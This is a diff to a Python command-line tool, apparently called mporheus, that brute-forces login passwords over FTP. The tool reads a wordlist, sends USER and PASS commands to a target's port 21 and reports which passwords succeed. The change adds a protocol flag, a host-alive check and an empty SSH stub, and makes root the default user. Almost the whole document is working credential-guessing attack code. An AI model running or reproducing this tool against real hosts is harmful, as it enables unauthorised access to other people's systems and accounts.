@@ -1,7 +1,10 @@
 #!/usr/bin/env python3
 import os
 import socket
+import sys
 import argparse
+
+from multiprocessing import Process
 from sys import exit
 
 def banner():
@@ -40,11 +43,20 @@ help_message = '''
         --host,     -h      target
         --user,     -u      user, default is root
         --wordlist, -w      wordlist used for the attack
+        --protocol, -p      protocol
     
+    Protocol supported:
+        ftp
+        ssh
+
     Example:
-        python mporheus.py --host 192.168.1.1 --user root --wordlist wordlist.txt
+        python mporheus.py -h 192.168.1.1 -u root -w wordlist.txt -p ftp
 
 '''
+
+class BruteSSH(object):
+    pass
+
 
 class BruteFTB(object):
     def __init__(self, host, user, wordlist):
@@ -58,8 +70,8 @@ class BruteFTB(object):
             read = wordlist.readlines()
         
             for line in read:
-                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
-                sc.connect((self.host, 21))
+                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sc.connect_ex((self.host, 21))
                 sc.recv(1024)
 
                 sc.send("USER {0}\r\n".format(self.user).encode())
@@ -80,14 +92,30 @@ class BruteFTB(object):
                 else:            
                     print("User: {0} - Password: {1} - failed".format(self.user, line.strip()))
 
+
+def error(msg):
+    print(msg)
+    sys.exit(1)
+
+def isAlive(host, protocol):
+    service_port = socket.getservbyname(protocol)
+    alive = socket.socket()
+    alive.settimeout(1)
+    status = alive.connect_ex((host, service_port))
+
+    return status
+
 def main():
 
     parser = argparse.ArgumentParser(add_help=False, usage=help_message)
     parser.add_argument('--host', '-h',     action="store", dest="host",\
                             required=True)
+    
+    parser.add_argument('--protocol', '-p',  action="store", dest="protocol",\
+                            required=True)
    
     parser.add_argument("--user", '-u',     action="store", dest="user",\
-                            required=True)
+                            default="root", required=False)
    
     parser.add_argument("--wordlist", '-w', action="store", dest="wordlist",\
                             required=True)
@@ -97,9 +125,17 @@ def main():
     host        = given_args.host
     user        = given_args.user
     wordlist    = given_args.wordlist
+    protocol    = given_args.protocol
 
-    FTP = BruteFTB(host, user, wordlist)
-    FTP.Checkout()
+    if (isAlive(host, protocol)) != 0:
+        error("Host not responding on protocol {0}".format(protocol))
+
+    if protocol == 'ftp':
+        FTP = BruteFTB(host, user, wordlist)
+        FTP.Checkout()
+    
+    elif protocol == 'ssh':
+        pass
 
 if __name__=='__main__':
     banner()
